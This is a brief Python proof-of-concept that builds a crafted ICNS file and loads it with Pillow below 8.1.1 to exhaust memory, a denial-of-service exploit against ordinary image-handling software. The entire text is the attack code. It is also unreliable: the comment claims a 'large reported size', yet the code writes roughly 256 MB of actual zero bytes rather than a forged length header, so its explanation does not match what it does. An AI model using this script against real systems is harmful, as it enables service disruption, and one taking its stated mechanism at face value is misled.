from PIL import Image # Pillow < 8.1.1

# Create a malicious ICNS image
with open('malicious.icns', 'wb') as f:
    f.write(b'\x49\x43\x4e\x53' + b'\x00' * 0x10000000)  # Large reported size

# Open the malicious image using Pillow
img = Image.open('malicious.icns')

# This will cause a denial of service (memory consumption) due to the large reported size
img.load()